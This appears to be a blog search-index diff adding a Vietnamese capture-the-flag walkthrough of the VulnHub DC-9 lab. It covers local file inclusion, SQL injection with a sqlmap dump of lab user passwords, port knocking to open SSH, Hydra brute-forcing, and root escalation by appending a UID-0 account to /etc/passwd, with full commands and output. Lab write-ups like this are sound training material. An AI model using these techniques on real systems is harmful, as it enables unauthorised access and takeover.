@@ -1896,4 +1896,194 @@ uid&#x3D;1002(robot) gid&#x3D;1002(robot) euid&#x3D;0(root) groups&#x3D;0(root),
         <tag>vulnhub</tag>
       </tags>
   </entry>
+  <entry>
+    <title>[VulnHub] DC-9</title>
+    <url>/2021/02/03/dc9-vulnhub/</url>
+    <content><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9</a><br>Difficulty: Easy</p>
+<a id="more"></a>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ nmap -sn 10.10.10.102-105 
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-04 17:22 +07
+Nmap scan report for 10.10.10.104
+Host is up (0.00028s latency).
+Nmap done: 4 IP addresses (1 host up) scanned in 1.26 seconds
+
+$ nmap -p- 10.10.10.104 --min-rate 3000
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-04 17:24 +07
+Nmap scan report for 10.10.10.104
+Host is up (0.00015s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+80&#x2F;tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
+
+$ nmap -A 10.10.10.104 -p 80           
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-04 17:25 +07
+Nmap scan report for 10.10.10.104
+Host is up (0.00053s latency).
+
+PORT   STATE SERVICE VERSION
+80&#x2F;tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache&#x2F;2.4.38 (Debian)
+|_http-title: Example.com - Staff Details - Welcome
+
+Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Hmm… bủn xỉn vcl, mở mỗi cổng 80-HTTP.<br><img src="1.png"><br><img src="2.png"><br>Từ từ đã, tại sao lại có dòng <em>File does not exist</em> ở kia? Tôi link ngay đến một bài CTF từng làm, truyền vào đây thêm một param nữa để gọi file. Đại khái là thằng manager.php đang gọi đến một hàm mở file và cần một param truyền vào (có thể là <em>file</em>, <em>f</em> hoặc gì gì…), nghe vô lý nhưng cái CTF style nó thế, chả đâu vào đâu :/<br><img src="3.png"><br>Chốt lại là web server dính lỗi LFI, lấy được mã nguồn trang, các thứ các thứ, nhưng chưa có thông tin nào cần để lấy được shell.<br>Quay lại với search.php, kiểm tra xem nó có dính SQL Injection hay không.<br><img src="4.png"><br>Okay… vậy là có SQL Injection luôn. Ném nó vào Sqlmap dump dữ liệu ra xem có gì hay ho…</p>
+<h2 id="Exploition"><a href="#Exploition" class="headerlink" title="Exploition"></a>Exploition</h2><h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Database: Staff
+Table: Users
+[1 entry]
++--------+----------------------------------+----------+
+| UserID | Password                         | Username |
++--------+----------------------------------+----------+
+| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
++--------+----------------------------------+----------+
+
+Database: users
+Table: UserDetails
+[17 entries]
++----+------------+---------------+---------------------+-----------+-----------+
+| id | lastname   | password      | reg_date            | username  | firstname |
++----+------------+---------------+---------------------+-----------+-----------+
+| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
+| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
+| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
+| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
+| 5  | Cat        | TC&amp;TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
+| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
+| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
+| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
+| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
+| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
+| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
+| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
+| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
+| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
+| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
+| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
+| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
++----+------------+---------------+---------------------+-----------+-----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Với mật khẩu hash của admin, đem crack chùa lấy được password ngon lành.<br>Thề, CrackStation với HashKiller lợi hại vãi cả đái.<br><img src="5.png"><br>Sau đó tôi có cố thử lợi dụng SQL Injection để up shell, chèn mã vào khắp nơi trên cái web site này. Sau 30 phút đéo đem lại gì ngoài sự chán nản. Đù, chả nhẽ nó khó đến thế à?<br><em>Và thế là tôi nén mở write up lên để xem xem bước tiếp theo họ làm như thế nào.<br>Cái mảng kiến thức này thực sự trước giờ tôi đéo biết :D</em><br>Như này…</p>
+<h3 id="Burp-suite"><a href="#Burp-suite" class="headerlink" title="Burp suite"></a>Burp suite</h3><p>Lần này quay lại với lỗi LFI ở trên đã phát hiện được, bây giờ tôi muốn fuzzing những file ở trong thư mục /etc để tìm kiếm thêm những cấu hình bên trong máy chủ này.<br><img src="6.png"><br><img src="7.png"></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[options]
+	UseSyslog
+
+[openSSH]
+	sequence    &#x3D; 7469,8475,9842
+	seq_timeout &#x3D; 25
+	command     &#x3D; &#x2F;sbin&#x2F;iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+	tcpflags    &#x3D; syn
+
+[closeSSH]
+	sequence    &#x3D; 9842,8475,7469
+	seq_timeout &#x3D; 25
+	command     &#x3D; &#x2F;sbin&#x2F;iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+	tcpflags    &#x3D; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Google về thằng klockd này xem nó là thằng ml nào.</p>
+<blockquote>
+<p>knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special “knock” sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open – since knockd listens at the link-layer level, it sees all traffic even if it’s destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.</p>
+</blockquote>
+<p>Nói qua một chút cho dễ hiểu, giống như trò gõ cửa mà hồi bé hay chơi, gõ cửa 4 lần thì người ở trong mới mở cửa, còn nếu gõ sai, có nghĩa người bên ngoài là người lạ, thì người bên trong sẽ không mở cửa.<br>Thằng ml Knockd này như kiểu là một thằng rảnh háng đứng ở tầng liên kết (trong mô hình OSI). Nó lắng nghe toàn bộ lưu lượng truy cập và khi nó nghe được một chuỗi <em>knock knock</em> giống như mật khẩu gõ cửa, nó sẽ chạy lệnh được xác định trong tệp cấu hình.<br>Phân tích tệp cấu hình knockd.conf. Có thể thấy, Knockd đang muốn lắng nghe lần lượt các gói tin TCP syn ở các cổng theo thứ tự 7469, 8475, 9842 để thực hiện lệnh mở cổng 22-SSH. Đây là lí do tại sao Nmap không thể quét ra được cổng 22-SSH trên máy chủ, vì nso có mở đéo đâu mà quét được.<br>Lúc này <em>knock knock knock</em> để mở cổng 22-SSH thôi nào :D</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ knock 10.10.10.104 7469 8475 9842
+
+$ nmap -p- 10.10.10.104
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-04 22:55 +07
+Nmap scan report for 10.10.10.104
+Host is up (0.0038s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22&#x2F;tcp open  ssh
+80&#x2F;tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Good! Cái này trước đây tôi đéo biết, vậy nên làm bài này khiến tôi có thêm một kiến thức mới, không hề tệ với một bài lab easy.<br>Có SSH rồi, giờ brute-force thôi. Tại sao lại là brute-force? Vì ở kia tôi đã lấy được danh sách người dùng trong hệ thống từ file /etc/passwd. Password thì lấy được từ Sqlmap ở trên, mặc dù nó chả liên quan cho lắm nhưng biết đâu có user nào đấy chủ quan đặt password trên web trùng với password trên server thì sao.</p>
+<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p><em>Lần này screen-shot Terminal cho nó màu mè</em><br><img src="8.png"></p>
+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><p>Với session của user janitor, có một cái file vớ vẩn như thế này.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">janitor@dc-9:~$ ls -al
+total 20
+drwxrwxrwx  5 janitor janitor 4096 Feb  4 21:54 .
+drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
+lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -&gt; &#x2F;dev&#x2F;null
+drwxr-xr-x  2 janitor janitor 4096 Feb  4 21:55 duma
+drwx------  3 janitor janitor 4096 Feb  4 21:55 .gnupg
+drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
+
+janitor@dc-9:~$ cd .secrets-for-putin
+
+janitor@dc-9:~&#x2F;.secrets-for-putin$ ls -al
+total 12
+drwx------ 2 janitor janitor 4096 Dec 29  2019 .
+drwxrwxrwx 5 janitor janitor 4096 Feb  4 21:54 ..
+-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt
+janitor@dc-9:~&#x2F;.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Hmm… lại có thểm một vài mật khẩu nữa, nối vào cuối file password.txt rồi gọi lại Hydra xem có lấy thêm được account nào trong hệ thống không.<br><img src="9.png"><br>He, có thêm của fredf.<br>Với mấy user tìm được bên trên thì đều không có tên trong danh sách khách mời của sudoers, mỗi fredf là có.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fredf@dc-9:~$ sudo -l
+Matching Defaults entries for fredf on dc-9:
+    env_reset, mail_badpass,
+    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User fredf may run the following commands on dc-9:
+    (root) NOPASSWD: &#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test
+fredf@dc-9:~$ &#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test
+Usage: python test.py read append<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Phần này tôi bỏ qua SUID, vì tìm rồi và chả có mẹ gì. Tập trung vào <em>/opt/devstuff/dist/test/test</em>. Tìm xem cái file <em>test.py</em> ở đâu và có nội dung gì.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fredf@dc-9:~$ find &#x2F; -name &quot;test.py&quot; 2&gt;&#x2F;dev&#x2F;null
+&#x2F;opt&#x2F;devstuff&#x2F;test.py
+&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;setuptools&#x2F;command&#x2F;test.py
+
+fredf@dc-9:~$ ls -al &#x2F;opt&#x2F;devstuff&#x2F;test.py
+-rw-r--r-- 1 root root 257 Feb  5 00:25 &#x2F;opt&#x2F;devstuff&#x2F;test.py
+
+fredf@dc-9:~$ cat &#x2F;opt&#x2F;devstuff&#x2F;test.py
+#!&#x2F;usr&#x2F;bin&#x2F;python
+
+import sys
+
+if len (sys.argv) !&#x3D; 3 :
+    print (&quot;Usage: python test.py read append. Adudu&quot;)
+    sys.exit (1)
+
+else :
+    f &#x3D; open(sys.argv[1], &quot;r&quot;)
+    output &#x3D; (f.read())
+
+    f &#x3D; open(sys.argv[2], &quot;a&quot;)
+    f.write(output)
+    f.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>File này chỉ có quyền đọc thôi, không có quyền sửa. Nhưng đọc nội dung xem nó làm cái gì.<br>Sau câu lệnh else, nó thực hiện đọc nội dung file <em>sys.argv[1]</em> và nối (appent) vào file <em>sys.argv[2]</em>, với quyền Root. ĐÙ!<br>Thế thì bây giờ tôi sẽ tự tạo một tài khoản bằng cách chèn thêm vào cuối file /etc/passwd với ID 0, vì trong Linux, user có ID 0 thì mặc định là Root.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fredf@dc-9:~$ echo minhdeptraivcl:$(openssl passwd 00000):0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash &gt; duma.txt
+
+fredf@dc-9:~$ cat duma.txt 
+minhdeptraivcl:FLvn5eWX&#x2F;KeFQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
+
+fredf@dc-9:~$ sudo &#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test duma.txt &#x2F;etc&#x2F;passwd
+
+fredf@dc-9:~$ cat &#x2F;etc&#x2F;passwd
+root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
+daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+...
+janitor2:x:1017:1017:Scott Morrison:&#x2F;home&#x2F;janitor2:&#x2F;bin&#x2F;bash
+minhdeptraivcl:FLvn5eWX&#x2F;KeFQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
+
+fredf@dc-9:~$ su minhdeptraivcl
+Password: 00000
+
+root@dc-9:&#x2F;home&#x2F;fredf# id
+uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Done, Ez!<br>Việc có quyền ghi file với quyền của Root giống như leo thang với các trình editer như Vim hay Nano vậy, có thể sửa đổi những file nhạy cảm như /etc/passwd, /etc/shadow và một loạt các file cấu hình quan trọng khác trong hệ thống của Linux.</p>
+]]></content>
+      <categories>
+        <category>VulnHub</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+        <tag>easy</tag>
+      </tags>
+  </entry>
 </search>
